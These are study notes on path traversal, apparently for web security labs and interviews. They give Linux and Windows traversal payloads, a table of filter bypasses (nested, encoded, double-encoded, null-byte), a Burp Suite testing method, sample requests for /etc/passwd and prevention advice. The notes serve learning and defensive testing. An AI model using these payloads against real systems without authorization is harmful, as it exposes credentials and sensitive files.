# Path Traversal — Study Notes

## 1. What it is
Occurs when an app builds a filesystem path from **user-controlled input** without safely validating it. Traversal sequences (`../`) let an attacker step outside the intended directory to read arbitrary files.

## 2. Impact
- Source code / config file disclosure
- Credentials, API keys, DB connection strings
- Sensitive OS files (`/etc/passwd`, `win.ini`)
- Other users' files
- Occasionally write/overwrite → potential full compromise

## 3. Where to look
Any parameter that looks like it references a file or path:
```
?filename=218.png   ?file=report.pdf   ?path=/images/photo.jpg
?document=invoice.pdf   ?page=home.html   ?template=profile   ?download=backup.zip
```
Also check: image loaders, downloads, document viewers, exports, template/language selection, attachment previews, URL paths, upload filenames.

## 4. How the vuln works
```
Base dir:  /var/www/images/
Input:     ../../../etc/passwd
Result:    /var/www/images/../../../etc/passwd  →  /etc/passwd
```
Each `../` moves up one directory; once at root, it reads the target file.

## 5. Basic payloads
**Linux**
```
../../../etc/passwd
../../../../etc/passwd
/etc/passwd
```
Test files: `/etc/passwd`, `/etc/hostname`, `/etc/hosts`

**Windows**
```
..\..\..\windows\win.ini
../../../windows/win.ini
C:\Windows\win.ini
```

## 6. Bypass cheat-sheet

| Defence | Bypass to try |
|---|---|
| `../` blocked | `/etc/passwd` (absolute path) |
| Traversal stripped once (non-recursive) | `....//....//....//etc/passwd` |
| Backslash variant accepted | `....\/....\/etc/passwd` |
| Filter applied pre-decode | `%2e%2e%2f` |
| Input decoded twice | `%252e%252e%252f` |
| Must start with base path | `/var/www/images/../../../etc/passwd` |
| Must end in `.png` | `../../../etc/passwd%00.png` |
| Forward slash blocked (Windows) | `..\..\windows\win.ini` |

Encoding progression:
```
../              normal
%2e%2e%2f        URL-encoded
%252e%252e%252f  double URL-encoded
```
Note: null-byte (`%00`) truncation only works on legacy/vulnerable stacks — not universal.

## 7. Testing methodology (Burp Suite)
1. Browse the app normally.
2. Find a request with a filename/path parameter.
3. Send to Repeater; record the baseline response.
4. Swap in a basic traversal payload.
5. Add more `../` if needed to reach root.
6. Try an absolute path.
7. Try nested / encoded / double-encoded variants.
8. Test prefix and extension validation bypasses.
9. Compare status code, response length, and content.
10. Save the working request/response as evidence.

Example:
```http
GET /loadImage?filename=../../../etc/passwd HTTP/1.1
Host: vulnerable-website.com
```

## 8. What to check in the response
- Contents of `/etc/passwd` or `win.ini`
- App config data leaking
- Response length differences
- `200 OK` on a request that should fail
- Files downloading unexpectedly
- Filesystem paths in error messages
- Behavioral diffs between valid vs. invalid filenames

⚠️ Don't rely on status code alone — a `200 OK` can still be an error page.

## 9. Root cause
App takes a user-supplied filename → concatenates with a server-side base directory → doesn't validate safely → passes result straight to a filesystem API.

## 10. Prevention
**Best:** never pass user input directly to filesystem APIs — map an internal ID to an approved file instead:
```
User supplies: image_id=218
Server maps:   218 → /var/www/images/218.png
```
**If filenames must be user-controlled:**
- Allowlist permitted filenames/characters
- Reject directory separators
- Build the path relative to a fixed base directory
- Canonicalize the final resolved path
- Verify the canonical path is still inside the intended base directory
- Least-privilege filesystem permissions
- Don't return detailed filesystem error messages

**Key principle:** stripping `../` once is not enough — encoded, nested, and absolute-path variants can all bypass a naive filter.

## 11. 30-second interview answer
> Path traversal happens when an app uses untrusted input to build a filesystem path without securely validating the final result. An attacker uses `../` or encoded/nested variants to escape the intended directory and read sensitive files. I'd test `filename`/`path` parameters in Burp Repeater with traversal, absolute-path, and encoding variants. The fix is avoiding direct filesystem access from user input — use allowlisted identifiers, canonicalize the path, and confirm it stays within the approved base directory.

## 12. Pentest finding template
**Title:** Path Traversal in Image-Loading Functionality

**Description:** The `filename` parameter in `/loadImage` accepts directory traversal sequences, allowing an unauthenticated user to access files outside the intended image directory.

**Evidence:**
```http
GET /loadImage?filename=../../../etc/passwd HTTP/1.1
Host: example.com
```
Server returned contents of `/etc/passwd`.

**Impact:** Disclosure of sensitive OS, config, or application files — potentially credentials, API keys, or data supporting further compromise.

**Recommendation:** Replace user-controlled filenames with server-side identifiers. If filenames must be accepted, apply strict allowlisting, canonicalize the final path, and confirm it stays within the authorized base directory.

## 13. Lab tracker

| Lab | Bypass tested | Solved independently? | Lesson |
|---|---|---|---|
| Simple case | `../../../etc/passwd` | | Basic traversal |
| Absolute path | `/etc/passwd` | | Avoided traversal sequences entirely |
| Non-recursive stripping | `....//` | ✅ | Filter only ran once — nested sequence collapses back into `../` |
| Double encoding | `%252e%252e%252f` | | App decoded input twice |
| Start-of-path validation | Base path + `../` | | Prefix check alone was insufficient |
| Extension validation | `%00.png` | | Null byte terminated the path |

---
*Focus for review: the testing checklist, bypass table, and per-lab lessons — that's what transfers to an unfamiliar target, not the prose explanations.*
